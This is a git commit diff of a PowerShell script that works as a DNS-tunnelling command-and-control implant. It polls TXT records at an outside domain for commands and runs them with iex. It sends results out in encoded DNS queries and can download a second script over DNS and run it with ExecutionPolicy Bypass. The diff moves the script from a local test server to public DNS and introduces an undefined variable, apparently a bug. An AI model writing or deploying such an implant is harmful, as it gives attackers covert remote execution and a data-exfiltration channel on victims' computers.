1620ed9950da8d580a37569b6e7318a1db6a31c0
networking101 <48070080+networking101@users.noreply.github.com>
2019-04-07 22:21:02 -0500

    Add files via upload

--- koratxt2.ps1
+++ koratxt2.ps1
@@ -1,5 +1,4 @@
-﻿$server = '192.168.0.108'
-$name = 'koratxt.com'
+﻿$name = 'koratxt.net'
 $id = Get-Content env:computername
 if ($id.Length -gt 10) {
     $id = $id.Substring(0,10)
@@ -38,9 +37,9 @@ function split_to_chunks($astring, $size=20) {
 function send_response($response) {
     $chunks = (split_to_chunks ($response.Replace("`r`n",";") -replace '\s\s+', ','))
     foreach ($j in $chunks) {
-        $(Resolve-DnsName -Server $server -Name "65786563.$j.$name" -Type TXT).Strings
+        $(Resolve-DnsName -Name "65786563.$j.$name" -Type TXT).Strings
     }
-    $(Resolve-DnsName -Server $server -Name "656e64.$name" -Type TXT)
+    $(Resolve-DnsName -Name "656e64.$name" -Type TXT)
     return $id
 }
 
@@ -48,31 +47,30 @@ function pull_file($size=255){
     $f = New-Item -Path '.\' -Name 'txt.ps1' -ItemType File
     $h = ''
     $index = 0
-    $file_size = $(Resolve-DnsName -Server $server -Name "73697a65.$name" -Type TXT).Strings
-    foreach ($i in 1..[int]"$file_size") {
-        $x = $(Resolve-DnsName -Server $server -Name "66696c65.$index.$name" -Type TXT).Strings
-        $index += $size    
-        $x | Add-Content -Path '.\txt.ps1'
-    }
-    $(Resolve-DnsName -Server $server -Name "656e64.$name" -Type TXT)
+    $file_size = $(Resolve-DnsName -Name "73697a65.$name" -Type TXT).Strings
+    foreach ($i in 1..[int]"$file_size") {        $x = $(Resolve-DnsName -Name "66696c65.$index.$name" -Type TXT).Strings        $index += $size        $x | Add-Content -Path '.\txt.ps1'    }
+    $(Resolve-DnsName -Name "656e64.$name" -Type TXT)
 }
 
 while ($true) {
-    $cmd = $(Resolve-DnsName -Server $server -Name "636d64.$name" -Type TXT).Strings
+    $cmd = $(Resolve-DnsName -Name "636d64.$name" -Type TXT).Strings
     if ($cmd -eq "file") {
         Remove-Item 'txt.ps1'
         pull_file
     }
-    elseif ($cmd -eq "filex") {
+    elseif ($rawtxt -eq "filex") {
         Remove-Item 'txt.ps1'
         pull_file
         Start-Job -ScriptBlock {powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -File '.\txt.ps1'}
         Remove-Item 'txt.ps1'
     }
-    elseif ($cmd.length -ne 0) {
-        $response = (iex "$cmd") | Out-String
+    elseif ($rawtxt.length -ne 0) {
+        $response = (iex "$rawtxt") | Out-String
         if ($response.Length -gt 0) {
             send_response $response
+        }
+        else {
+            $(Resolve-DnsName -Name "656e64.$name" -Type TXT)
         }
     }
     sleep -Seconds 5
